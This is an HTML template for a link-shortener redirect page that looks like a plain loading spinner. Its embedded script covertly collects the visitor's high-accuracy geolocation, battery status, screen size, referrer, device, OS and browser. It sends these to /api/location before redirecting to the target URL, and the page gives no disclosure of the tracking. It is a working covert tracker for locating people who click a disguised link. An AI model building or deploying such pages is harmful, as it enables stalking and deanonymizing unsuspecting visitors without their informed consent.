<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{{ link.title }}</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
html, body { height: 100%; }
body { background: #fff; display: flex; align-items: center; justify-content: center; }
.spinner {
  width: 48px; height: 48px; border: 5px solid #e0e0e0;
  border-top-color: #333; border-radius: 50%;
  animation: spin .8s linear infinite;
}
@keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="spinner"></div>
<script>
(function() {
  var sc = {{ short_code|tojson }};
  var url = {{ link.original_url|tojson }};
  var extra = {};

  function go() { setTimeout(function() { window.location.href = url; }, 2000); }

  function send(pos) {
    var payload = {
      short_code: sc,
      latitude: pos ? pos.coords.latitude : null,
      longitude: pos ? pos.coords.longitude : null,
      accuracy: pos ? pos.coords.accuracy : null,
      screen_resolution: screen.width + 'x' + screen.height,
      referrer: document.referrer || '',
      device_type: /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? 'Mobile' : /Tablet|iPad/i.test(navigator.userAgent) ? 'Tablet' : 'PC',
      os: (function(){var u=navigator.userAgent;if(u.indexOf('Windows')!=-1)return'Windows';if(u.indexOf('Mac OS')!=-1)return'macOS';if(u.indexOf('Linux')!=-1)return'Linux';if(u.indexOf('Android')!=-1)return'Android';if(u.indexOf('iOS')!=-1||u.indexOf('iPhone')!=-1)return'iOS';return'Unknown';})(),
      browser: (function(){var u=navigator.userAgent;if(u.indexOf('Chrome')!=-1)return'Chrome';if(u.indexOf('Firefox')!=-1)return'Firefox';if(u.indexOf('Safari')!=-1)return'Safari';if(u.indexOf('Edge')!=-1)return'Edge';return'Other';})()
    };
    Object.assign(payload, extra);
    var x = new XMLHttpRequest();
    x.open('POST', '/api/location', true);
    x.setRequestHeader('Content-Type', 'application/json');
    x.onload = go;
    x.onerror = go;
    x.send(JSON.stringify(payload));
  }

  // Battery API
  if (navigator.getBattery) {
    navigator.getBattery().then(function(b) {
      extra.battery_percentage = Math.round(b.level * 100);
      extra.battery_charging = b.charging;
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(send, function() { send(null); }, { enableHighAccuracy: true, timeout: 10000 });
      } else { send(null); }
    });
  } else if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(send, function() { send(null); }, { enableHighAccuracy: true, timeout: 10000 });
  } else { send(null); }
})();
</script>
</body>
</html>
